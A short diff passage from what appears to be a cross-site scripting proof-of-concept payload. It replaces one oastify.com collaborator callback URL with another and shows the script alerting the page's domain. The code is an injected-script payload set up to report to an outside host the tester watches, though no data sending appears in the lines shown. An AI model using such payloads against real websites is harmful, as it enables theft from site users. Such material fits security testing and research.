@@ -4,7 +4,7 @@
 (function () {
   if (window.__poc014) { return; } window.__poc014 = 1;   // reflected twice; run once
   var d = document, O = d.domain;
-  var C = 'https://cl1xu7hi3pk8m35w5imazf105rbiz9ny.oastify.com';   // <-- the collaborator YOU watch
+  var C = 'https://f8o73hfalb52bemfi8ejcd31ys4nsdg2.oastify.com';   // <-- the collaborator YOU watch
    alert(C);
    alert(document.domain);
   var KEEP = [];
